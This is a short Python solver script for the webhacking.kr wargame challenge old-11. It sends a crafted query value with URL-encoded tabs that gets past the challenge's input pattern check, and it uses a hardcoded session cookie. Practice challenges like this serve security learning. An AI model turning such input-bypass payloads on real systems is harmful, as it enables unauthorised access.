import requests

url = "https://webhacking.kr/challenge/code-2?"
cookie = {'PHPSESSID':'5gkqftfs3geu9r34l853vqo3le'}

def solve():
    ip = requests.get("https://api.ipify.org").text
    payload = "val=1abcde_{}%09p%09a%09s%09s".format(ip)
    res = requests.get(url=url+payload, cookies=cookie)
    if "old-11 Pwned!" in res.text:
        print("old-11 Pwned!")
    elif "already solved" in res.text:
        print("already solved")

if __name__ == "__main__":
    solve()